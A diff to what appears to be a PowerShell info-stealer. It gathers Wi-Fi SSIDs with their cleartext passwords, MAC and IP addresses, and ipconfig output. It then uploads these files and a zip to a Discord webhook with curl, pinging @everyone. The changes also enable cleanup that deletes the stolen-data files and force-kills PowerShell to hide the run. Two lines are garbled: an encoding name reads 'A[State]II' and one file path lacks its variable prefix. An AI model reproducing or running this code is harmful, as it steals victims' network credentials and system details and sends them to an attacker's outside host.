@@ -25,6 +25,21 @@ Get-ChildItem "$e\Wi-Fi*.xml" | ForEach-Object {
     "SSID:$ssid | Password:$pass" | Out-File -Append -FilePath $wifiFile
 }
 
+
+$netInfoFile = Join-Path $e "netinfo.txt"
+
+Get-NetAdapter | ForEach-Object {
+    $i = $_
+    $ips = Get-NetIPAddress -InterfaceIndex $i.ifIndex -ErrorAction SilentlyContinue
+    [pscustomobject]@{
+        Name = $i.Name
+        Type = $i.InterfaceDescription
+        MAC  = $i.MacAddress
+        IPv4 = ($ips | Where-Object AddressFamily -eq IPv4 | Select-Object -Expand IPAddress -ErrorAction Ignore) -join ', '
+        IPv6 = ($ips | Where-Object AddressFamily -eq IPv6 | Select-Object -Expand IPAddress -ErrorAction Ignore) -join ', '
+    }
+} | Format-Table -AutoSize | Out-File $netInfoFile -Encoding A[State]II
+
 ipconfig /all | Out-File "$e\ipcfg.txt"
 
 
@@ -33,22 +48,23 @@ $ipv4 = (Get-NetIPAddress -AddressFamily IPv4).IPAddress
 $ipv6 = (Get-NetIPAddress -AddressFamily IPv6).IPAddress
 
 # Send to discord
-$info    = "IPS: $($ipv4 -join ', ') | MACS: $($mac -join ', ') | IPv6: $($ipv6 -join ', ')"
+$info    = "IPv4: $($ipv4 -join ',\n') \n\n| MACS: $($mac -join ',\n') \n\n| IPv6: $($ipv6 -join ',\n')"
 $content = "$($whoami_content) | $info | @everyone"
 
 Write-Output about to send to discord, file exists! $zip, $wifiFile, $e\ipcfg.txt
-Invoke-WebRequest -Uri $wh -Method POST -Body @{
-    content = $content
-    file1   = Get-Item $zip
-    file2   = Get-Item $wifiFile
-    file3   = Get-Item "$e\ipcfg.txt"
-}
+curl.exe -F "content=$content" `
+         -F "file1=@$zip" `
+         -F "file2=@$wifiFile" `
+         -F "file3=@$e\ipcfg.txt" `
+         -F "file4=@netInfoFile.txt" `
+         $wh
 Write-Output sent to discord
 # cleanup
-#cls
-#Remove-Item -Path "$wifiFile" -Force
-#Remove-Item -Path "$e\ipcfg.txt" -Force
-#Remove-Item -Path "$zip" -Force
+cls
+Remove-Item -Path "$wifiFile" -Force
+Remove-Item -Path "$e\ipcfg.txt" -Force
+Remove-Item -Path "$zip" -Force
+Remove-Item -Path "$netInfoFile" -Force
 
 #exit quickly
-#taskkill /F /IM pwsh.exe /IM powershell.exe 2>$null 
+taskkill /F /IM pwsh.exe /IM powershell.exe 2>$null 
